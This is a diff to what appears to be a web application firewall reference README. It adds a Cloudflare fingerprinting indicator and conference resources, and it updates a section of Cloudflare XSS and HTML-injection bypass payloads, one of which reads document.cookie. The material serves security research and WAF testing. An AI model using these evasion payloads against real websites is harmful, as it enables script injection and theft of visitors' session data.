@@ -608,6 +608,7 @@ Wanna fingerprint WAFs? Lets see how.
                     <li><code>Server</code> header field has value <code>cloudflare</code>.</li>
                     <li><code>Set-Cookie</code> response headers have <code>__cfuid=</code> cookie field.</li>
                     <li>Page content might have <code>Attention Required!</code> or <code>Cloudflare Ray ID:</code>.</li>
+                    <li>Page content may contain <code>DDoS protection by Cloudflare</code>as text.</li>
                     <li>You may encounter <code>CLOUDFLARE_ERROR_500S_BOX</code> upon hitting invalid URLs.</li>
                 </ul>
             </ul>
@@ -2997,23 +2998,26 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ``` 
 
 ### Cloudflare
-- XSS Bypass by [@c0d3g33k](https://twitter.com/c0d3g33k)
+- [HTML Injection](https://twitter.com/spyerror/status/1161432029319376897) by [@spyerror](https://twitter.com/spyerror)
+```
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+```
+- [XSS Bypass](https://pastebin.com/i8Ans4d4) by [@c0d3g33k](https://twitter.com/c0d3g33k)
 ```
 <a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
 ```
-- XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar)
+- [XSS Bypasses](https://twitter.com/h1_ragnar) by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar)
 ```
 <svg onload=prompt%26%230000000040document.domain)>
 <svg onload=prompt%26%23x000000028;document.domain)>
 xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 1'"><img/src/onerror=.1|alert``>
 ```
-- XSS Bypass by [@RakeshMane10](https://twitter.com/rakeshmane10)
+- [XSS Bypass](https://twitter.com/RakeshMane10/status/1109008686041759744) by [@RakeshMane10](https://twitter.com/rakeshmane10)
 ```
 <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
 ```
-
-- XSS Bypass by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
+- [XSS Bypass](https://twitter.com/ArbazKiraak/status/1090654066986823680) by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
 ```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
 ```
@@ -3504,6 +3508,7 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 - [The Death of a Web App Firewall](https://www.youtube.com/watch?v=mB_xGSNm8Z0) from [Brian McHenry](https://www.youtube.com/channel/UCxzs-N2sHnXFwi0XjDIMTPg).
 - [Adventures with the WAF](https://www.youtube.com/watch?v=rdwB_p0KZXM) from [BSides Manchester](https://www.youtube.com/channel/UC1mLiimOTqZFK98VwM8Ke4w).
 - [Bypassing Intrusion Detection Systems](https://www.youtube.com/watch?v=cJ3LhQXzrXw) from [BlackHat](https://blackhat.com).
+- [Building Your Own WAF as a Service and Forgetting about False Positives](https://www.youtube.com/watch?v=dgqUcHprolc) from [Auscert](https://conference.auscert.org.au).
 
 ## Presentations & Research Papers
 ### Research Papers:
@@ -3531,6 +3536,7 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 - [Our Favorite XSS Filters/IDS and how to Attack Them](presentations/Our%20Favourite%20XSS%20WAF%20Filters%20And%20How%20To%20Bypass%20Them.pdf) - A presentation about how to evade XSS filters set by WAF rules from [BlackHat USA 09](https://www.blackhat.com/html/bh-us-09/).
 - [Playing Around with WAFs](presentations/Playing%20Around%20with%20WAFs.pdf) - A small presentation about WAF profiling and playing around with them from [Defcon 16](http://www.defcon.org/html/defcon-16/dc-16-post.html).
 - [A Forgotten HTTP Invisiblity Cloak](presentation/A%20Forgotten%20HTTP%20Invisibility%20Cloak.pdf) - A presentation about techniques that can be used to bypass common WAFs from [BSides Manchester](https://www.bsidesmcr.org.uk/).
+- [Building Your Own WAF as a Service and Forgetting about False Positives](presentations/Building%20Your%20Own%20WAF%20as%20a%20Service%20and%20Forgetting%20about%20False%20Positives.pdf) - A presentation about how to build a hybrid mode waf that can work both in an out-of-band manner as well as inline to reduce false positives and latency [Auscert2019](https://conference.auscert.org.au/).
 
 ## Credits & License:
 This work has been presented by [Infected Drake](https://twitter.com/0xInfection) [(0xInfection)](https://github.com/0xinfection) and is licensed under the [Apache 2.0 License](LICENSE). 
